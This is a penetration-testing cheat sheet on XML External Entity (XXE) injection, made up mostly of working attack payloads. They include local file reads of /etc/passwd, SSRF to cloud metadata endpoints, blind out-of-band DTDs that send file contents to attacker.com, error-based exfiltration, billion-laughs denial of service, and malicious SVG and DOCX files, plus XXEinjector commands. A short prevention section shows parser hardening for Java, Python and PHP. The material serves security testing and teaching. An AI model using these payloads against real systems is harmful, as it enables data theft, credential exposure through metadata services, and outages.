# XXE Injection (XML External Entity)

## Description
XXE Injection exploits vulnerable XML parsers that process external entity references. This can lead to file disclosure, SSRF, denial of service, and in some cases remote code execution.

## Basic XXE Payloads

### File Disclosure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Windows File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

### PHP Wrapper (Base64)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

## SSRF via XXE

### Internal Network
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal.server/secret">
]>
<foo>&xxe;</foo>
```

### Cloud Metadata
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

## Blind XXE

### Out-of-Band via HTTP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
]>
<foo>&send;</foo>
```

**evil.dtd on attacker server:**
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### Out-of-Band via DNS
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://xxe.attacker.com/">
]>
<foo>&xxe;</foo>
```

### Error-Based Exfiltration
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<foo>test</foo>
```

## Parameter Entities

### Basic Parameter Entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % param "<!ENTITY xxe 'test'>">
    %param;
]>
<foo>&xxe;</foo>
```

### External Parameter Entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % external SYSTEM "http://attacker.com/evil.dtd">
    %external;
]>
<foo>&send;</foo>
```

## Denial of Service

### Billion Laughs Attack
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### Quadratic Blowup
```xml
<?xml version="1.0"?>
<!DOCTYPE kaboom [
    <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- Long string -->
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;...</kaboom>
```

## XXE in Different Formats

### SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="20">&xxe;</text>
</svg>
```

### DOCX/XLSX (Office Documents)
```bash
# Extract and modify
unzip document.docx
# Edit [Content_Types].xml or other XML files
# Add XXE payload
zip -r malicious.docx *
```

### SOAP Request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <foo>&xxe;</foo>
    </soap:Body>
</soap:Envelope>
```

### XML-RPC
```xml
<?xml version="1.0"?>
<!DOCTYPE methodCall [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
    <methodName>&xxe;</methodName>
</methodCall>
```

## Bypass Techniques

### Encoding Bypass
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- UTF-7 (if supported) -->
<?xml version="1.0" encoding="UTF-7"?>
```

### CDATA Bypass
```xml
<!DOCTYPE foo [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
]>
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

## Tools

### XXEinjector
```bash
# https://github.com/enjoiz/XXEinjector

ruby XXEinjector.rb --host=attacker.com --file=/tmp/request.txt
```

### oxml_xxe
```bash
# https://github.com/BuffaloWill/oxml_xxe
# Create malicious Office documents

ruby server.rb
# Upload generated document to target
```

## Detection

### Check XML Parser
```xml
<!-- Test if DTD is processed -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY test "XXE Test">
]>
<foo>&test;</foo>
```

### External Request Test
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
]>
<foo>&xxe;</foo>
```

## Prevention

### Disable DTDs (Most Secure)
```java
// Java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

```python
# Python (defusedxml)
from defusedxml import ElementTree
ElementTree.parse(xml_file)
```

```php
// PHP
libxml_disable_entity_loader(true);
```

### Disable External Entities
```java
// Java
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## Testing Checklist

- [ ] Test basic file disclosure
- [ ] Test SSRF to internal services
- [ ] Test SSRF to cloud metadata
- [ ] Test blind XXE with OOB callback
- [ ] Test error-based exfiltration
- [ ] Test XXE in file uploads (SVG, DOCX)
- [ ] Test XInclude injection
- [ ] Test with different encodings

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://portswigger.net/web-security/xxe
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
